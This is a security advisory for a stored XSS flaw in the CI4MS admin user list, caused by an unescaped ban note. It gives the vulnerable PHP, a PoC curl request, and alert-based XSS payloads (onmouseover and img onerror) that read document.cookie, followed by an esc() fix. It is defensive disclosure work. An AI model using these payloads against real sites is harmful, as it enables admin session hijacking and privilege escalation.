# [M] CI4MS has stored XSS via Unescaped Blacklist Note in Admin User List

## Summary
Severity: Medium
Advisory: GHSA-7cm9-v848-cfh2
CVE: CVE-2026-39391
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-7cm9-v848-cfh2
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The blacklist (ban) note parameter in `UserController::ajax_blackList_post()` is stored in the database without sanitization and rendered into an HTML `data-note` attribute without escaping. An admin with blacklist privileges can inject arbitrary JavaScript that executes in the browser of any other admin who views the user management page.

## Details

In `modules/Users/Controllers/UserController.php`, the `ajax_blackList_post()` method (line 344-362) accepts a `note` POST parameter with only a `required` validation rule:

```php
// Line 347 — validation only checks 'required', no sanitization
$valData = (['note' => ['label' => lang('Backend.notes'), 'rules' => 'required'],
             'uid' => ['label' => 'uid', 'rules' => 'required|is_natural_no_zero']]);

// Line 352 — raw user input passed directly to ban()
$user->ban($this->request->getPost('note'));
```

Shield's `Bannable::ban()` trait stores the message as-is:
```php
// vendor/codeigniter4/shield/src/Traits/Bannable.php
public function ban(?string $message = null): self
{
    $this->status         = 'banned';
    $this->status_message = $message;  // No escaping
    // ...
}
```

In the `users()` method (line 13-91), when building the DataTables response, the `status_message` is concatenated directly into HTML without escaping:

```php
// Line 55 — esc() IS used here (correct)
$result->fullname = esc($result->firstname) . ' ' . esc($result->surname);

// Line 58-59 — NO esc() on status_message (vulnerable)
if ($result->status == 'banned'):
    $result->actions .= '<button ... data-note="' . $result->status_message . '">'
```

The HTML string is returned as JSON (line 90) and DataTables renders it into the DOM. CSP is disabled (`$CSPEnabled = false` in `App.php`), and no `SecureHeaders` filter is applied.

## PoC

**Step 1 — Store XSS payload via ban endpoint:**
```bash
curl -X POST 'https://TARGET/backend/users/blackList' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: ci_session=ADMIN_SESSION_WITH_UPDATE_PERM' \
  -d 'uid=2&note=%22+onmouseover%3D%22alert(document.cookie)%22+x%3D%22'
```

Expected response: `{"result":true,"error":{"type":"success","message":"..."}}`

**Step 2 — Trigger payload:**
Any admin navigating to `/backend/users` will receive HTML containing:
```html
<button ... data-note="" onmouseover="alert(document.cookie)" x="">
```

The XSS fires when the admin hovers over the blacklist button for the banned user.

**Alternative immediate-execution payload:**
```
note="><img src=x onerror=alert(document.cookie)>
```

## Impact

- **Session hijacking**: An attacker with blacklist privileges can steal session cookies of other admins (including superadmins who view the user list but are themselves protected from being banned).
- **Privilege escalation**: A lower-privileged admin could use stolen superadmin sessions to gain full control.
- **Persistent**: The payload persists in the database and fires every time the user list is loaded, affecting all admins who view the page.

## Recommended Fix

Wrap `status_message` with `esc()` to match the escaping already applied to other user fields on line 55:

```php
// In users() method, line 58-59 — change:
$result->actions .= '<button type="button" class="btn btn-outline-dark btn-sm open-blacklist-modal"
                        data-id="' . $result->id . '" data-status="' . $result->status . '" data-note="' . esc($result->status_message) . '"><i
```

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-7cm9-v848-cfh2
- https://nvd.nist.gov/vuln/detail/CVE-2026-39391
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
